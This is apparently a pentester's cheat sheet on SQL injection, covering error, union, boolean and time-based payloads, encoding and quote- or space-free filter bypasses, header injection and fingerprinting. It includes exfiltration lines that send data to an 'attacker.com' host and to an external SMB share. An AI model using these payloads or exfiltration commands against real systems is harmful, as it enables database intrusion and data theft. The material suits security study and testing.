## 💉 In-Band SQL Injection


This technique is considered the most common and straightforward type of SQL injection attack. In this technique, the attacker uses the same communication channel for both the injection and the retrieval of data. There are two primary types of in-band SQL injection:

* **Error-Based SQL Injection:** The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. 
```sql
# Induce a type conversion error to extract database version
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version));
```
* Tool: SQL Database / Error-Based Payload

* **Union-Based SQL Injection:** The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables.
```sql
# Append administrator credentials to standard user query results
SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin;
```
* Tool: SQL Database / Union-Based Payload

## 🦯 Inferential (Blind) SQL Injection


Inferential SQL injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the application’s behaviour and response times to infer information about the database. There are two primary types of inferential SQL injection:

* **Boolean-Based Blind SQL Injection:** The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false.
```sql
# Evaluate application response changes based on true vs false conditions
SELECT * FROM users WHERE id = 1 AND 1=1; -- True condition
SELECT * FROM users WHERE id = 1 AND 1=2; -- False condition
```
* Tool: SQL Database / Boolean-Based Payload

* **Time-Based Blind SQL Injection:** The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false.

```sql
# Force a 5-second server delay if the injected condition evaluates to true
SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--;
```
* Tool: SQL Database / Time-Based Payload

## 🔣 Character Encoding

Character encoding involves converting special characters in the SQL injection payload into encoded forms that may bypass input filters.

* **URL Encoding:** A common method where characters are represented using a percent sign followed by their ASCII value in hexadecimal. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
```text
# URL encode standard payload to bypass basic WAF signatures
Original: ' OR 1=1--
Encoded:  %27%20OR%201%3D1--
```
* Tool: Web Application Payload / URL Encoder

* **Hexadecimal Encoding:** An effective technique for constructing SQL queries using hexadecimal values to bypass filters that do not decode these values before processing the input.
```sql
# Use hex encoding for string literal 'admin'
SELECT * FROM users WHERE name = 0x61646d696e;
```
* Tool: SQL Database / Hex Encoder

* **Unicode Encoding:** Represents characters using Unicode escape sequences. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.
```text
# Unicode encode string literal 'admin'
\u0061\u0064\u006d\u0069\u006e
```
* Tool: Web Application Payload / Unicode Encoder

## 🚫 No-Quote SQL Injection

No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.

* **Using Numerical Values:** Use numerical values or other data types that do not require quotes. This technique can bypass filters that specifically look for an escape or strip out quotes.
```sql
# Inject logical OR condition without using string quotes
OR 1=1
```
* Tool: SQL Database / Injection Payload

* **Using SQL Comments:** Use SQL comments to terminate the rest of the query, effectively ignoring the remainder of the SQL statement to bypass filters and prevent syntax errors.
```sql
# Use comment syntax to truncate the original query
admin--
```
* Tool: SQL Database / Comment Payload

* **Using CONCAT() Function:** Attackers can use SQL functions like CONCAT() to construct strings without quotes, making it harder for filters to detect and block the payload.
```sql
# Construct the string 'admin' dynamically using hexadecimal concatenation
CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
```
* Tool: SQL Database / CONCAT Function

## 🌌 No Spaces Allowed

When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

* **Comments to Replace Spaces:** Use SQL inline comments to replace spaces, allowing the payload to bypass filters that remove or block standard space characters.
```sql
# Substitute spaces with inline block comments
SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin';
```
* Tool: SQL Database / Inline Comments

* **Tab or Newline Characters:** Use tab or newline characters as substitutes for spaces. Some filters might allow these characters.
```sql
# Substitute spaces with tab characters
SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin';
```
* Tool: SQL Database / Tab Substitution

* **Alternate Characters:** Use alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space).

## 📤 Data Exfiltration Techniques

By leveraging database functions that allow external connections, attackers can send sensitive data directly to a server they control.

* **HTTP Requests:** Exploits database functionalities that can make outbound HTTP connections (often via UDFs or external scripts if configured).
```sql
# Exfiltrate data via HTTP POST request using a User-Defined Function
SELECT http_post('[http://attacker.com/exfiltrate](http://attacker.com/exfiltrate)', sensitive_data) FROM books;
```
* Tool: SQL Database / HTTP UDF

* **DNS Exfiltration:** Generates DNS requests with encoded data sent to a malicious DNS server. This bypasses HTTP-based monitoring systems.

* **SMB Exfiltration:** Writing query results to an SMB share on an external server. Highly effective in Windows environments but also configurable in Linux (e.g., Ubuntu).
```sql
# Export query results to an external attacker-controlled SMB share
SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
```
* Tool: SQL Database / INTO OUTFILE (SMB)

## ⚠️ Important Configuration Consideration

It is important to note that the MySQL system variable secure_file_priv may be set, mitigating the risk of unauthorised file operations.

* **When secure_file_priv is Set:** MySQL will restrict file operations such as INTO OUTFILE to the specified directory, limiting the ability to exfiltrate data to arbitrary locations.
* **When secure_file_priv is Empty:** MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This poses a high risk.

## 🕵️ HTTP Header Injection

HTTP headers can carry user input, which might be used in SQL queries on the server side. If these inputs are not sanitised, it can lead to SQL injection via headers like User-Agent, Referer, or X-Forwarded-For.

```http
# Inject SQL payload via the HTTP User-Agent header
User-Agent: ' OR 1=1; --
```
* Tool: HTTP Client / Header Injection Payload

## 🎯 Pentester Strategies

* **Exploiting Database-Specific Features:** Understand specifics of the target DBMS (MySQL, PostgreSQL, Oracle, MSSQL). For instance, MSSQL supports the xp_cmdshell command to execute system commands.
* **Leveraging Error Messages:** Provoke error messages that reveal structural insights.
```sql
# Extract version information through engineered type mismatch error
1' AND 1=CONVERT(int, (SELECT @@version)) --
```
* Tool: SQL Database / Error Extraction

* **Bypassing WAF and Filters:** Test obfuscation techniques including mixed case, alternate encodings, inline comments, and concatenation.
```sql
# Use ASCII character concatenation to evade basic string matching
CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))
```
* Tool: SQL Database / WAF Bypass Payload

* **Database Fingerprinting:** Determine the type and version of the database to tailor the attack.
```sql
# DBMS-specific version fingerprinting queries
SELECT version(); -- PostgreSQL
SELECT @@version; -- MySQL and MSSQL
```
* Tool: SQL Database / Fingerprinting Payload

* **Pivoting with SQL Injection:** Use the compromised database server to pivot and gain access to other internal systems, extract credentials, or exploit trust relationships.
